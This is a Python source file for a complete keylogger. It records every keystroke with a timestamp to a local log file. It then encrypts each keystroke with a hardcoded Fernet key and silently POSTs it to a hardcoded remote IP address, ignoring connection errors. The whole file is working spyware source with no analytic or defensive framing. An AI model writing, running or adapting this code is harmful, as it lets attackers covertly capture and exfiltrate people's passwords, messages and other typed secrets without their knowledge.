import pynput.keyboard
import requests
import os
from datetime import datetime
from cryptography.fernet import Fernet
# === CONFIGURATION ===
SECRET_KEY = b'j5uZ5X8DnqoLk7miCltsA8wrfNg-7dLGp1Ns5XGMQ4g='  # Must match decrypt key
cipher_suite = Fernet(SECRET_KEY)

log_file = "logs.txt"  # Local hidden file to store captured keystrokes
server_url = 'http://54.87.241.76:5000/upload'  # <-- Send encrypted keystrokes here

# === FUNCTION TO SEND ENCRYPTED LOGS TO SERVER ===

def send_log_to_server(log_message):
    try:
        encrypted_message = cipher_suite.encrypt(log_message.encode('utf-8'))
        requests.post(server_url, data=encrypted_message, timeout=5)
    except Exception as e:
        pass  # Ignore any connection issues silently


# === FUNCTION TO FORMAT KEYBOARD INPUT ===
def format_key(key):
    key = str(key).replace("'", "")
    if key == "Key.space":
        return " "
    elif key == "Key.enter":
        return "\n"
    elif key.startswith("Key."):
        return f"[{key.replace('Key.', '').upper()}]"
    else:
        return key


# === FUNCTION WHEN A KEY IS PRESSED ===
def on_key_press(key):
    try:
        formatted_key = format_key(key)
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_message = f"[{timestamp}] {formatted_key}"

        # Save locally
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(log_message + "\n")

        # Send encrypted message
        send_log_to_server(log_message)

    except Exception:
        pass

# === START THE KEYLOGGER ===
def start_keylogger():
    listener = pynput.keyboard.Listener(on_press=on_key_press)
    listener.start()
    listener.join()

# === MAIN ENTRY POINT ===
if __name__ == "__main__":
    start_keylogger()

